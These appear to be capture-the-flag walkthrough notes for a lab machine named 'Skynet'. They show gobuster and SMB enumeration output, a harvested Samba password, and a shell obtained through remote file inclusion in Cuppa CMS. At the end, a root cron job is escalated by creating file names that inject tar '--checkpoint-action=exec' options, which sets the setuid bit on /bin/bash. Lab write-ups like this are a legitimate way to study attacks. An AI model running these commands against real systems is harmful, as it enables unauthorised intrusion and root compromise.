# Skynet

# Gobuster results
```
Found 
/admin
/config
/ai

Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.19.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/21 02:47:10 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 308] [--> http://10.10.19.2/admin/]
/css                  (Status: 301) [Size: 306] [--> http://10.10.19.2/css/]  
/js                   (Status: 301) [Size: 305] [--> http://10.10.19.2/js/]   
/config               (Status: 301) [Size: 309] [--> http://10.10.19.2/config/]
/ai                   (Status: 301) [Size: 305] [--> http://10.10.19.2/ai/] 

```

# SMBMap results

```
└─$ smbmap -H 10.10.19.2                                                                                                                                2 ⨯
[+] Guest session       IP: 10.10.19.2:445      Name: 10.10.19.2                                        
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))
```

# Connecting to anonymous gave us an email password for milesdyson. 
# squirrelmail can be found at the website.
# password reset email send to miles.
# ")s{A&2Z=F^n_E.B`" is is new password for his samba share.

# Found hidden website directory
    /45kra24zxs28v3yd

# Ran GoBuster on this directory and found
#   /administrator

# Cuppa CMS is vulnerable to a RFI attack.
# Got a shell via RFI using a PHP reverse shell.

# wget linpeas

# linpeas found this
#    */1 *   * * *   root    /home/milesdyson/backups/backup.sh

# we can exploit the wildcard '*' in the backup.sh script which copies all files from
#   /var/www/html and zips them. by creating files using the below script we can get the root cron
#   job to give /bin/bash a set uid bit.

printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"

# after this runs, we're root if we do '/bin/bash -p'